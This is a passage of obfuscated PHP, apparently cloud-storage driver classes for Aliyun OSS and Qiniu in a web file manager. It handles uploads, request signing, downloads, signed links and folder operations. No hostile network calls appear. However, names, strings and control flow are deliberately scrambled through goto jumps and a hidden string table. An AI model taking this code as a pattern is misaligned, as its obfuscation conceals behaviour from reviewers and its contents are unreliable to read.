$F´Š¿ˆ¤½[8]); $aåîˆÉÄˆÇ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($F´Š¿ˆ¤½[1239] => @md5_file($cï¡ïµŠ¼ç)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($b‘Ì©ª))); $aåîˆÉÄˆÇ = $this->trafficLimit($F´Š¿ˆ¤½[1250], $aåîˆÉÄˆÇ); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($cºŞÙŒ‰§Ö), $cï¡ïµŠ¼ç, $aåîˆÉÄˆÇ); } catch (OSS\Core\OssException $Aˆ‡Ÿİô×) { return !1; } return $this->getPathOuter($b‘Ì©ª); } public function getHost() { $CŞ¨Œ»Çƒ =& $_SERVER[¢Í]; $f™ïªªƒ = explode($CŞ¨Œ»Çƒ[185], parent::getHost()); return $f™ïªªƒ[0] . $CŞ¨Œ»Çƒ[185] . $this->bucket . $CŞ¨Œ»Çƒ[101] . $f™ïªªƒ[1]; } public function uploadFormData($eƒÚ°ººç„, $D²Ùİ„ËÌ = 3600) { goto CÇ¶Ö†ç‘½; CÇ¶Ö†ç‘½: $a÷¬‹­Úñ =& $_SERVER[¢Í]; if (!($C£¦‹‰²Ï = $this->getHost())) { return !1; } $CÔªˆÄ‚™ = $D²Ùİ„ËÌ; goto b“íÇù˜®ˆ; C¸°öó±ù: $FâÀÑˆˆ³³ = $this->pathFather($eƒÚ°ººç„); $DÎŒÊøŒİæ = array($a÷¬‹­Úñ[1154] => $b—À‹ÀÁ°±, $a÷¬‹­Úñ[1155] => array(array($a÷¬‹­Úñ[1255], 0, $a»ˆ«ªÈŒ‹), array($a÷¬‹­Úñ[1158], $a÷¬‹­Úñ[1159], $FâÀÑˆˆ³³))); $fŞ‰¦÷‘ø = base64_encode(json_encode($DÎŒÊøŒİæ)); goto aíæ‚¦’ñŠ; b“íÇù˜®ˆ: $C‡ùÌ‹ ÷« = date($a÷¬‹­Úñ[1253], time() + $CÔªˆÄ‚™); $DÕ†àì°Î = new DateTime($C‡ùÌ‹ ÷«); $b—À‹ÀÁ°± = $DÕ†àì°Î->format(DateTime::ISO8601); goto cå¨­Ğ²ù; aíæ‚¦’ñŠ: $A®…İ¶¡— = base64_encode(hash_hmac($a÷¬‹­Úñ[235], $fŞ‰¦÷‘ø, $this->secret, !0)); $C£È¿¸Ãæ = array($a÷¬‹­Úñ[1164] => $fŞ‰¦÷‘ø, $a÷¬‹­Úñ[1256] => $this->accessKey, $a÷¬‹­Úñ[1160] => $a÷¬‹­Úñ[1152], $a÷¬‹­Úñ[1257] => $A®…İ¶¡—, $a÷¬‹­Úñ[183] => $C£¦‹‰²Ï); $C£È¿¸Ãæ = $this->trafficLimit($a÷¬‹­Úñ[1250], $C£È¿¸Ãæ); goto cœªÏà¡äá; cœªÏà¡äá: return $C£È¿¸Ãæ; goto eš×ÙÎ‚¸×; cå¨­Ğ²ù: $B¬İ…ˆ¢ò = strpos($b—À‹ÀÁ°±, $a÷¬‹­Úñ[299]); $b—À‹ÀÁ°± = substr($b—À‹ÀÁ°±, 0, $B¬İ…ˆ¢ò) . $a÷¬‹­Úñ[1254]; $a»ˆ«ªÈŒ‹ = 1048576000 * 5; goto C¸°öó±ù; eš×ÙÎ‚¸×: } public function multiUploadFormData($Dµ¯Š†ÉÉ„, $dÇ“‘‘Ş„ = 3600) { $Cò˜¥ìº‰æ =& $_SERVER[¢Í]; if (!($b”¬ñ˜è—õ = $this->getHost())) { return !1; } $CõÁ‰Áß = $this->trafficLimit($Cò˜¥ìº‰æ[1250]); $F­ÎÕ’»§ğ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Dµ¯Š†ÉÉ„), $CõÁ‰Áß); return array($Cò˜¥ìº‰æ[227] => $F­ÎÕ’»§ğ, $Cò˜¥ìº‰æ[183] => $b”¬ñ˜è—õ . $Cò˜¥ìº‰æ[8] . $this->pathEncode($Dµ¯Š†ÉÉ„), $Cò˜¥ìº‰æ[228] => gmdate($Cò˜¥ìº‰æ[1258]), $Cò˜¥ìº‰æ[99] => $Dµ¯Š†ÉÉ„); } public function multiUploadAuthData($A«È‘Šƒ‰à, $b‡Ø£ºÌ£Ø = array()) { goto BîßØ½‘; Bø¡­† : $EÖÔØš² ï = $A«È‘Šƒ‰à; if (isset($b‡Ø£ºÌ£Ø[$cĞ•Õ¥É¡[99]])) { $EÖÔØš² ï = $b‡Ø£ºÌ£Ø[$cĞ•Õ¥É¡[99]]; unset($b‡Ø£ºÌ£Ø[$cĞ•Õ¥É¡[99]]); } if (isset($b‡Ø£ºÌ£Ø[$cĞ•Õ¥É¡[229]])) { $b‡Ø£ºÌ£Ø[$cĞ•Õ¥É¡[228]] = $EğÕ’Ù‡‘Ü; return $this->listUploadParts($EÖÔØš² ï, $b‡Ø£ºÌ£Ø); } goto d‹êç±·ô³; d‹êç±·ô³: $B•¶ï³¬„ = array($cĞ•Õ¥É¡[230], $cĞ•Õ¥É¡[33], $cĞ•Õ¥É¡[126], $EğÕ’Ù‡‘Ü, "\170\55\x6f\x73\163\55\x64\x61\164\x65\72{$EğÕ’Ù‡‘Ü}", $cĞ•Õ¥É¡[8] . $this->bucket . $cĞ•Õ¥É¡[8] . $EÖÔØš² ï . $aÁ¥‹¬±ˆ«); if (strpos($aÁ¥‹¬±ˆ«, $cĞ•Õ¥É¡[231]) === 0) { $B•¶ï³¬„[0] = $cĞ•Õ¥É¡[232]; if ($BÌë‚Õš¨£ = $this->trafficLimit($cĞ•Õ¥É¡[1250])) { $EÖÔØš² ï = $cĞ•Õ¥É¡[1259]; array_splice($B•¶ï³¬„, 5, 0, $EÖÔØš² ï . $cĞ•Õ¥É¡[4] . $BÌë‚Õš¨£[$EÖÔØš² ï]); } } if (isset($b‡Ø£ºÌ£Ø[$cĞ•Õ¥É¡[233]]) && $b‡Ø£ºÌ£Ø[$cĞ•Õ¥É¡[233]] == $cĞ•Õ¥É¡[234]) { $B•¶ï³¬„[0] = $cĞ•Õ¥É¡[234]; } goto CÂä¦â× ³; cŞ¿£›è¸: $fßä·±ä…ƒ = $cĞ•Õ¥É¡[1223] . $this->accessKey . $cĞ•Õ¥É¡[4] . $f”†¡¹é ²; if (strpos($aÁ¥‹¬±ˆ«, $cĞ•Õ¥É¡[231]) === 0) { $fßä·±ä…ƒ = array($cĞ•Õ¥É¡[237] => $fßä·±ä…ƒ, $cĞ•Õ¥É¡[228] => $EğÕ’Ù‡‘Ü); if ($BÌë‚Õš¨£) { $fßä·±ä…ƒ = array_merge($fßä·±ä…ƒ, $BÌë‚Õš¨£); } } return $fßä·±ä…ƒ; goto EÌºæ³¾; CÂä¦â× ³: if (!empty($b‡Ø£ºÌ£Ø[$cĞ•Õ¥É¡[1260]])) { $f¬ ­éÆÕŸ = array_merge(array($B•¶ï³¬„[4]), $b‡Ø£ºÌ£Ø[$cĞ•Õ¥É¡[1260]]); sort($f¬ ­éÆÕŸ); $B•¶ï³¬„[4] = implode($cĞ•Õ¥É¡[56], $f¬ ­éÆÕŸ); } $e§ŠÜù«œ = implode($cĞ•Õ¥É¡[56], $B•¶ï³¬„); $f”†¡¹é ² = base64_encode(hash_hmac($cĞ•Õ¥É¡[235], $e§ŠÜù«œ, $this->secret, !0)); goto cŞ¿£›è¸; BîßØ½‘: $cĞ•Õ¥É¡ =& $_SERVER[¢Í]; $EğÕ’Ù‡‘Ü = isset($b‡Ø£ºÌ£Ø[$cĞ•Õ¥É¡[228]]) ? $b‡Ø£ºÌ£Ø[$cĞ•Õ¥É¡[228]] : gmdate($cĞ•Õ¥É¡[1258]); $aÁ¥‹¬±ˆ« = isset($b‡Ø£ºÌ£Ø[$cĞ•Õ¥É¡[175]]) ? $b‡Ø£ºÌ£Ø[$cĞ•Õ¥É¡[175]] : $cĞ•Õ¥É¡[33]; goto Bø¡­† ; EÌºæ³¾: } public function listUploadParts($dø¤…ñ”Î÷, $FÔæÇ›¯”ã) { goto d‡‹»È‡àÓ; Fô•Íã‡·Î: unset($FÔæÇ›¯”ã[$Fñº›ÎËç„[229]], $FÔæÇ›¯”ã[$Fñº›ÎËç„[233]]); $e™æÄÅâœ = $this->multiUploadAuthData($dø¤…ñ”Î÷, $FÔæÇ›¯”ã); if (empty($e™æÄÅâœ)) { return !1; } goto e¦õÅ‘ŒƒŠ; e¦õÅ‘ŒƒŠ: return array($Fñº›ÎËç„[237] => $e™æÄÅâœ, $Fñº›ÎËç„[228] => $FÔæÇ›¯”ã[$Fñº›ÎËç„[228]], $Fñº›ÎËç„[239] => $Dè°ƒº¦èâ); goto EÅÊÕ¥ÄÍ‰; e»ä¥îİ¼: $b÷í½ãåó = $EâÄŠ‡Ğ‚‹->getListPart(); $Dè°ƒº¦èâ = array(); foreach ($b÷í½ãåó as $f¯©Ã™·ˆ) { $Dè°ƒº¦èâ[] = array($Fñº›ÎËç„[1243] => $f¯©Ã™·ˆ->getPartNumber(), $Fñº›ÎËç„[1244] => trim($f¯©Ã™·ˆ->getETag(), $Fñº›ÎËç„[123])); } goto Fô•Íã‡·Î; d‡‹»È‡àÓ: $Fñº›ÎËç„ =& $_SERVER[¢Í]; $eÈ÷¤¸ÙÎ = parse_url_query($FÔæÇ›¯”ã[$Fñº›ÎËç„[175]]); $EâÄŠ‡Ğ‚‹ = $this->client->listParts($this->bucket, $this->pathEncode($dø¤…ñ”Î÷), $eÈ÷¤¸ÙÎ[$Fñº›ÎËç„[227]]); goto e»ä¥îİ¼; EÅÊÕ¥ÄÍ‰: } public function download($CæÁÂˆ‰ê’, $c–À§Ñ¾“‹) { if ($this->isFolder($CæÁÂˆ‰ê’)) { return !1; } try { $aÒĞóÉö‰À = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $c–À§Ñ¾“‹); $aÒĞóÉö‰À = $this->trafficLimit($_SERVER[¢Í][115], $aÒĞóÉö‰À); $this->client->getObject($this->bucket, $this->pathEncode($CæÁÂˆ‰ê’), $aÒĞóÉö‰À); } catch (OSS\Core\OssException $fËµö“Üšõ) { return !1; } return $c–À§Ñ¾“‹; } public function fileSubstr($E¼–âëìÅ, $Fõª™¸™ğî = 0, $fõ“»©‘· = false) { if ($Fõª™¸™ğî === -1) { $DºÒÅà›ã = array(); } else { if ($fõ“»©‘· === !1) { $e†ìí°Ş® = $this->size($E¼–âëìÅ); } else { $e†ìí°Ş® = $Fõª™¸™ğî + $fõ“»©‘· - 1; } $DºÒÅà›ã = array(OSS\OssClient::OSS_RANGE => "{$Fõª™¸™ğî}\x2d{$e†ìí°Ş®}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($E¼–âëìÅ), $DºÒÅà›ã); } catch (OSS\Core\OssException $Càù¨„Œ°·) { think_exception($Càù¨„Œ°·->getMessage()); return !1; } } private function trafficLimit($eßœ®’Ò¢ù, $A‰Æš‡Œá‹ = array()) { goto bÎÖ«ß£‹À; dÜÒø™®ÕÖ: if (!$B•–ØÃ²Ã­) { return $A‰Æš‡Œá‹; } $B•–ØÃ²Ã­ = $B•–ØÃ²Ã­ < 819200 ? 819200 : ($B•–ØÃ²Ã­ > 838860800 ? 838860800 : $B•–ØÃ²Ã­); $A‰Æš‡Œá‹[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($B•–ØÃ²Ã­); goto céíòÜ‰Éæ; céíòÜ‰Éæ: return $A‰Æš‡Œá‹; goto C”§»¥Ö†—; bÎÖ«ß£‹À: $A§’ˆŠÃš¢ =& $_SERVER[¢Í]; if ($eßœ®’Ò¢ù == $A§’ˆŠÃš¢[1250] && $this->isUploadServer() || $eßœ®’Ò¢ù == $A§’ˆŠÃš¢[115] && $this->isFileOutServer()) { return $A‰Æš‡Œá‹; } $B•–ØÃ²Ã­ = floatval($GLOBALS[$A§’ˆŠÃš¢[6]][$A§’ˆŠÃš¢[94]][$A§’ˆŠÃš¢[113]][$eßœ®’Ò¢ù]) * 1024 * 1024 * 8; goto dÜÒø™®ÕÖ; C”§»¥Ö†—: } public function link($b¢³«‰ã†¯, $fĞÁÎç—ÑÀ = array()) { $a–’ÊôùñŞ =& $_SERVER[¢Í]; if (!$this->exist($b¢³«‰ã†¯) || $this->isFolder($b¢³«‰ã†¯)) { return !1; } try { $fĞÁÎç—ÑÀ = $this->trafficLimit($a–’ÊôùñŞ[115], $fĞÁÎç—ÑÀ); $C®»¨÷÷Îò = $this->client->signUrl($this->bucket, $this->pathEncode($b¢³«‰ã†¯), 3600 * 12, $a–’ÊôùñŞ[234], $fĞÁÎç—ÑÀ); return $this->getCdnLink($C®»¨÷÷Îò); } catch (OSS\Core\OssException $eŸ èµá¸) { return !1; } } public function fileOut($fåäî·±Ìé, $c¦ìËñµƒ = false, $dŒ‡åöÇ¦ = false, $AŸÏÎÍ™¼¡ = '') { goto aŒõù ÇÒ¦; aŒõù ÇÒ¦: $D¶£Ó„Äî =& $_SERVER[¢Í]; if ($this->isFileOutServer()) { return $this->fileOutServer($fåäî·±Ìé, $c¦ìËñµƒ, $dŒ‡åöÇ¦, $AŸÏÎÍ™¼¡); } if (!$dŒ‡åöÇ¦) { $dŒ‡åöÇ¦ = $this->pathThis($fåäî·±Ìé); } goto d¡Œ‘ìòƒ¡; E´Œ„„Ú²Å: $c¦ìËñµƒ = $c¦ìËñµƒ ? $D¶£Ó„Äî[220] : $D¶£Ó„Äî[221]; $cˆ‹Û”šÖù = array(OSS\OssClient::OSS_SUB_RESOURCE => $D¶£Ó„Äî[1261] . rawurlencode("{$c¦ìËñµƒ}\x3b\x66\x69\154\x65\156\x61\155\x65\75{$dŒ‡åöÇ¦}")); $cˆ‹Û”šÖù[OSS\OssClient::OSS_SUB_RESOURCE] .= $D¶£Ó„Äî[1262] . rawurlencode($BìÂ·¾óÔ’); goto Aè™‹ƒ¡; Aè™‹ƒ¡: $B©ÎóÏƒÃÕ = $this->link($fåäî·±Ìé, $cˆ‹Û”šÖù); $this->fileOutLink($B©ÎóÏƒÃÕ); goto e”Ş˜; d¡Œ‘ìòƒ¡: $dŒ‡åöÇ¦ = rawurlencode($dŒ‡åöÇ¦); $BìÂ·¾óÔ’ = get_file_mime(get_path_ext($dŒ‡åöÇ¦)); if ($BìÂ·¾óÔ’ == $D¶£Ó„Äî[219]) { return parent::fileOut($fåäî·±Ìé, $c¦ìËñµƒ, $dŒ‡åöÇ¦, $AŸÏÎÍ™¼¡); } goto E´Œ„„Ú²Å; e”Ş˜: } public function fileOutServer($A‘¾¨Ç‚öç, $cİÜù·ã™õ = false, $cëø‡‚ôÀ = false, $f£¶í¿Òİ’ = '') { parent::fileOut($A‘¾¨Ç‚öç, $cİÜù·ã™õ, $cëø‡‚ôÀ, $f£¶í¿Òİ’); } public function fileOutImage($d‚òÚ¿îµŸ, $BÜĞÄÚ˜¤‡ = 250) { $AèŠÄÉ¿ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[¢Í][1263] . $BÜĞÄÚ˜¤‡); $B¸ğÎì‘„Ä = $this->link($d‚òÚ¿îµŸ, $AèŠÄÉ¿); $this->fileOutLink($B¸ğÎì‘„Ä); } public function fileOutImageServer($A›­™ëÃŠ, $e¼İù˜çî = 250) { parent::fileOutImage($A›­™ëÃŠ, $e¼İù˜çî); } public function fileOutLink($e©¤Åİá³›) { $Eì°±ğÎğÌ =& $_SERVER[¢Í]; if (!$this->isCdnHost() && substr($e©¤Åİá³›, 0, 7) == $Eì°±ğÎğÌ[1167]) { $e©¤Åİá³› = $Eì°±ğÎğÌ[1168] . substr($e©¤Åİá³›, 7); } header($Eì°±ğÎğÌ[166] . $e©¤Åİá³›); die; } public function hashMd5($CçîöëÅö­, $c¶ßÊ«´®é = '') { $a‚Ä÷ù©¾” =& $_SERVER[¢Í]; $B–Ï‹–‹ÛŸ = $this->_objectMeta($CçîöëÅö­); if (!$B–Ï‹–‹ÛŸ) { return $a‚Ä÷ù©¾”[33]; } if (!isset($B–Ï‹–‹ÛŸ[$a‚Ä÷ù©¾”[1239]]) && !empty($c¶ßÊ«´®é)) { $fìê´ô™Ó« = $this->updateObjMeta($CçîöëÅö­, array($a‚Ä÷ù©¾”[1239] => $c¶ßÊ«´®é)); $B–Ï‹–‹ÛŸ[$a‚Ä÷ù©¾”[1239]] = $fìê´ô™Ó« ? $c¶ßÊ«´®é : $a‚Ä÷ù©¾”[33]; } return isset($B–Ï‹–‹ÛŸ[$a‚Ä÷ù©¾”[1239]]) ? strtolower($B–Ï‹–‹ÛŸ[$a‚Ä÷ù©¾”[1239]]) : $a‚Ä÷ù©¾”[33]; } public function size($FÖôâÇçİ±) { $C¯÷Æ²£µ = $this->objectMeta($FÖôâÇçİ±); return $C¯÷Æ²£µ ? $C¯÷Æ²£µ[$_SERVER[¢Í][87]] : 0; } public function info($e¤¸¬˜­æÜ) { if ($this->isFolder($e¤¸¬˜­æÜ)) { return $this->folderInfo($e¤¸¬˜­æÜ); } else { if ($this->isFile($e¤¸¬˜­æÜ)) { return $this->fileInfo($e¤¸¬˜­æÜ); } } return !1; } public function exist($CŸòš¥É×ê) { return $this->isFile($CŸòš¥É×ê) || $this->isFolder($CŸòš¥É×ê); } public function isFile($c„ƒ‡¬±¯¯) { return !$this->isFolder($c„ƒ‡¬±¯¯) && $this->objectMeta($c„ƒ‡¬±¯¯); } public function isFolder($a«¦ğ‚˜ˆ) { return $this->cacheMethod($_SERVER[¢Í][205], $a«¦ğ‚˜ˆ); } protected function objectMeta($EÁ½šŒ··³) { return $this->cacheMethod($_SERVER[¢Í][206], $EÁ½šŒ··³); } protected function _objectMeta($dÍÆæÒË…) { $aœËÆôÔ¹œ =& $_SERVER[¢Í]; try { $e¾î®º‘™À = $this->client->getObjectMeta($this->bucket, $this->pathEncode($dÍÆæÒË…)); } catch (OSS\Core\OssException $C‡½ –‹„Œ) { $e¾î®º‘™À = !1; } if ($e¾î®º‘™À) { $e¾î®º‘™À[$aœËÆôÔ¹œ[87]] = intval($e¾î®º‘™À[$aœËÆôÔ¹œ[1237]]); } return $e¾î®º‘™À; } protected function _isFolder($BÊ»¶‡ğ—) { $F¤«–Œ«§ö =& $_SERVER[¢Í]; if ($BÊ»¶‡ğ— == $F¤«–Œ«§ö[33] || $BÊ»¶‡ğ— == $F¤«–Œ«§ö[8]) { return !0; } $D¯ù¢ßÏ¢ = array($F¤«–Œ«§ö[1233] => $F¤«–Œ«§ö[8], $F¤«–Œ«§ö[1234] => rtrim($BÊ»¶‡ğ—, $F¤«–Œ«§ö[8]) . $F¤«–Œ«§ö[8], $F¤«–Œ«§ö[1235] => 1, $F¤«–Œ«§ö[1236] => $F¤«–Œ«§ö[33]); $D¤ñ»ƒéù = $this->client->listObjects($this->bucket, $D¯ù¢ßÏ¢); if ($D¤ñ»ƒéù->getObjectList() || $D¤ñ»ƒéù->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public function __construct($EÑõ»‡ì§) { parent::__construct(); require_once SDK_DIR . $_SERVER[¢Í][1264]; $this->_init($EÑõ»‡ì§); } public function _init($dÀ›È´–¹Ë) { goto Aõœîé¸çî; Aõœîé¸çî: $f¯™è§Á¶ =& $_SERVER[¢Í]; foreach ($dÀ›È´–¹Ë as $CÃ¶‡¸è‚å => $A‹”Û¡Û«‡) { if (isset($this->{$CÃ¶‡¸è‚å})) { $this->{$CÃ¶‡¸è‚å} = $A‹”Û¡Û«‡; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($f¯™è§Á¶[1265] . LNG($f¯™è§Á¶[1224])); } goto f—¡”ÒİÕ; E©Õ¿‘ï°è: $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); goto f™ÂŒ¹¬•; f—¡”ÒİÕ: $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); goto E©Õ¿‘ï°è; f™ÂŒ¹¬•: } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($e¬ÑÓ®ğ”Š, $A‰¼ÓÅ · = '', $E¹“„Èë = REPEAT_RENAME) { if ($this->setContent($e¬ÑÓ®ğ”Š, $A‰¼ÓÅ ·)) { return $this->getPathOuter($e¬ÑÓ®ğ”Š); } return !1; } public function mkdir($dÎÓ‹©¯², $b“¤Ê±›‡ = REPEAT_SKIP) { goto b”¸é¸ŞŠ•; aàå×ÏÜˆ¡: $dÎÓ‹©¯² = $d†‘¾ÅÒ¶ . $f’ä«åóö[8]; $eÜŠÜ«çßå = get_path_this($d†‘¾ÅÒ¶); $e­×‹±ïÎÀ = $dÎÓ‹©¯² . $eÜŠÜ«çßå; goto aÉ™äÊ¯; aÉ™äÊ¯: if (!$this->mkfile($e­×‹±ïÎÀ)) { return !1; } if (!$this->moveFile($e­×‹±ïÎÀ, $dÎÓ‹©¯²)) { $this->delFile($e­×‹±ïÎÀ); return !1; } return $this->getPathOuter($d†‘¾ÅÒ¶); goto BÖä°Ç…İØ; b”¸é¸ŞŠ•: $f’ä«åóö =& $_SERVER[¢Í]; $d†‘¾ÅÒ¶ = trim($dÎÓ‹©¯², $f’ä«åóö[8]); if ($this->_isFolder($d†‘¾ÅÒ¶)) { return $this->getPathOuter($d†‘¾ÅÒ¶); } goto aàå×ÏÜˆ¡; BÖä°Ç…İØ: } public function copyFile($cá³Æ„ŠÒ, $AÈâ™ØÎ°¾) { $EíÑë„£ = $this->bucketManager->copy($this->bucket, $cá³Æ„ŠÒ, $this->bucket, $AÈâ™ØÎ°¾, !0); return $EíÑë„£ ? !1 : $this->getPathOuter($AÈâ™ØÎ°¾); } public function moveFile($D»‡†¿éø‹, $f„áíŞÏ‹) { $d¦Ìï‚µÖŞ = $this->bucketManager->move($this->bucket, $D»‡†¿éø‹, $this->bucket, $f„áíŞÏ‹, !0); return $d¦Ìï‚µÖŞ ? !1 : $this->getPathOuter($f„áíŞÏ‹); } public function delFile($CÑ²¤»ä¹ì) { if (!$this->exist($CÑ²¤»ä¹ì)) { return !0; } $eÆ¬•ÎáõÍ = $this->bucketManager->delete($this->bucket, $CÑ²¤»ä¹ì); return $eÆ¬•ÎáõÍ ? !1 : !0; } public function delFolder($CøÚñ§Ìâ) { goto dŠÒÚ‹Øªª; dŠÒÚ‹Øªª: $AÛ„Ûšƒß =& $_SERVER[¢Í]; if (!$this->exist($CøÚñ§Ìâ)) { return !0; } $this->listItemCache = !1; goto dØ¿‡÷™Ê¤; aĞÆÁÙßÃê: return $this->delByBatch($FØÑ…†Ÿ[$AÛ„Ûšƒß[84]]); goto BâÈ¸Ù¿ä; f¹ƒ¶êäÂ: if (!empty($CøÚñ§Ìâ) && !in_array($dÕ˜¹í ­, $FØÑ…†Ÿ[$AÛ„Ûšƒß[84]])) { $FØÑ…†Ÿ[$AÛ„Ûšƒß[84]][] = $dÕ˜¹í ­; } $DŞ¹ÑğŠ = $this->delByBatch($FØÑ…†Ÿ[$AÛ„Ûšƒß[83]]); if (!$DŞ¹ÑğŠ) { return !1; } goto aĞÆÁÙßÃê; dØ¿‡÷™Ê¤: $FØÑ…†Ÿ = $this->fileList($CøÚñ§Ìâ); $this->listItemCache = !0; $dÕ˜¹í ­ = trim($CøÚñ§Ìâ, $AÛ„Ûšƒß[8]) . $AÛ„Ûšƒß[8]; goto f¹ƒ¶êäÂ; BâÈ¸Ù¿ä: } private function delByBatch($C¬ÁâŠ£Ÿà) { foreach (array_chunk($C¬ÁâŠ£Ÿà, 1000) as $DèÚ§İ¸µ) { $A¹ãÌìùƒ = $this->bucketManager->buildBatchDelete($this->bucket, $DèÚ§İ¸µ); list($fÓÇô¬Ãø, $eğ™êíæ®Œ) = $this->bucketManager->batch($A¹ãÌìùƒ); if ($eğ™êíæ®Œ) { return !1; } } return !0; } public function rename($F¥Ã°çª, $eå¸÷Âù) { return $this->renameObject($F¥Ã°çª, $eå¸÷Âù); } public function fileInfo($dñÎâ’‰ô´, $f–ôÄ¡íÖ = false, $C‰“Š‘ƒĞ¬ = array()) { goto Bµ¹Ì¯Öä…; Bñ±òÙáÏ¢: if (isset($C‰“Š‘ƒĞ¬[$dËÂÎæª¦[1267]])) { $eÔÔÃ¤Œ¦İ[$dËÂÎæª¦[117]] = substr($C‰“Š‘ƒĞ¬[$dËÂÎæª¦[1267]] . $dËÂÎæª¦[33], 0, 10); } if (isset($C‰“Š‘ƒĞ¬[$dËÂÎæª¦[1266]])) { $eÔÔÃ¤Œ¦İ[$dËÂÎæª¦[87]] = $C‰“Š‘ƒĞ¬[$dËÂÎæª¦[1266]]; } return $eÔÔÃ¤Œ¦İ; goto Döñºâƒõ; D‹ùËêÕÚÒ: $eÔÔÃ¤Œ¦İ[$dËÂÎæª¦[200]] = $eÔÔÃ¤Œ¦İ[$dËÂÎæª¦[117]] = 0; $eÔÔÃ¤Œ¦İ[$dËÂÎæª¦[201]] = $eÔÔÃ¤Œ¦İ[$dËÂÎæª¦[202]] = !0; if (empty($C‰“Š‘ƒĞ¬)) { $C‰“Š‘ƒĞ¬ = $this->objectMeta($dñÎâ’‰ô´); if (!$C‰“Š‘ƒĞ¬) { return $eÔÔÃ¤Œ¦İ; } } goto Bñ±òÙáÏ¢; Bµ¹Ì¯Öä…: $dËÂÎæª¦ =& $_SERVER[¢Í]; $eÔÔÃ¤Œ¦İ = array($dËÂÎæª¦[28] => $this->pathThis($dñÎâ’‰ô´), $dËÂÎæª¦[85] => $this->getPathOuter($dËÂÎæª¦[8] . $dñÎâ’‰ô´), $dËÂÎæª¦[29] => $dËÂÎæª¦[181], $dËÂÎæª¦[87] => isset($C‰“Š‘ƒĞ¬[$dËÂÎæª¦[1266]]) ? $C‰“Š‘ƒĞ¬[$dËÂÎæª¦[1266]] : 0, $dËÂÎæª¦[175] => $this->ext($dñÎâ’‰ô´)); if ($f–ôÄ¡íÖ) { return $eÔÔÃ¤Œ¦İ; } goto D‹ùËêÕÚÒ; Döñºâƒõ: } public function folderInfo($EÁœ„ßóè«, $F¾–É„¸ê = false) { goto eã”´‹³Šë; dëŸÒß¡Üï: $aíõÄ…Ùâ[$F¥ÄÇ–¥ò¸[200]] = $aíõÄ…Ùâ[$F¥ÄÇ–¥ò¸[117]] = 0; $aíõÄ…Ùâ[$F¥ÄÇ–¥ò¸[201]] = $aíõÄ…Ùâ[$F¥ÄÇ–¥ò¸[202]] = !0; $EÁœ„ßóè« = rtrim($EÁœ„ßóè«, $F¥ÄÇ–¥ò¸[8]) . $F¥ÄÇ–¥ò¸[8]; goto cåÑÕ«ÔÌå; eã”´‹³Šë: $F¥ÄÇ–¥ò¸ =& $_SERVER[¢Í]; $aíõÄ…Ùâ = array($F¥ÄÇ–¥ò¸[28] => $this->pathThis($EÁœ„ßóè«), $F¥ÄÇ–¥ò¸[85] => $this->getPathOuter($F¥ÄÇ–¥ò¸[8] . $EÁœ„ßóè«), $F¥ÄÇ–¥ò¸[29] => $F¥ÄÇ–¥ò¸[86]); if ($F¾–É„¸ê) { return $aíõÄ…Ùâ; } goto dëŸÒß¡Üï; cåÑÕ«ÔÌå: $AµÎ­Ğëƒ‡ = $this->objectMeta($EÁœ„ßóè«); if (isset($AµÎ­Ğëƒ‡[$F¥ÄÇ–¥ò¸[1267]])) { $aíõÄ…Ùâ[$F¥ÄÇ–¥ò¸[117]] = substr($AµÎ­Ğëƒ‡[$F¥ÄÇ–¥ò¸[1267]] . $F¥ÄÇ–¥ò¸[33], 0, 10); } return $aíõÄ…Ùâ; goto c÷¶Ş‰¹ˆĞ; c÷¶Ş‰¹ˆĞ: } public function listPath($fƒÓ´ÔŠÀ§, $cÉÌ÷‡²¦í = false) { $FÎ¬›Õã¶• =& $_SERVER[¢Í]; $BÂ‘—ñù¬° = $this->fileList($fƒÓ´ÔŠÀ§, $FÎ¬›Õã¶•[8], !0); foreach ($BÂ‘—ñù¬°[$FÎ¬›Õã¶•[84]] as $e•‚ĞÑ¸¬¼ => $D £Ô»±µ¹) { $BÂ‘—ñù¬°[$FÎ¬›Õã¶•[84]][$e•‚ĞÑ¸¬¼] = $this->folderInfo($D £Ô»±µ¹, $cÉÌ÷‡²¦í); } foreach ($BÂ‘—ñù¬°[$FÎ¬›Õã¶•[83]] as $e•‚ĞÑ¸¬¼ => $D £Ô»±µ¹) { $BÂ‘—ñù¬°[$FÎ¬›Õã¶•[83]][$e•‚ĞÑ¸¬¼] = $this->fileInfo($D £Ô»±µ¹[$FÎ¬›Õã¶•[99]], $cÉÌ÷‡²¦í, $D £Ô»±µ¹); } return $BÂ‘—ñù¬°; } public function has($cğª±ÕÚ˜ó, $B‚ñ¤Œ›ãê = false, $A°àÆ¼‹ˆ = true) { goto C·ôôí; Eõ†‹ÅĞó: $dÈ™è§¥ï– = $b®ÔğªÀî¯[33]; $DĞöÎ­İŞ¸ = 500; $cğ„îÂé“Ú = $b®ÔğªÀî¯[8]; goto a‰Ã’²’Š; a±„Îù×¿—: return !1; goto dÇä©”æº¼; C·ôôí: $b®ÔğªÀî¯ =& $_SERVER[¢Í]; $cğª±ÕÚ˜ó = trim($cğª±ÕÚ˜ó, $b®ÔğªÀî¯[8]); $DŸã¤¶—Á‰ = empty($cğª±ÕÚ˜ó) ? $b®ÔğªÀî¯[33] : $cğª±ÕÚ˜ó . $b®ÔğªÀî¯[8]; goto Eõ†‹ÅĞó; a‰Ã’²’Š: $CÇÕåŞöñâ = $c¬ƒ­˜ÍÊË = 0; while (!0) { 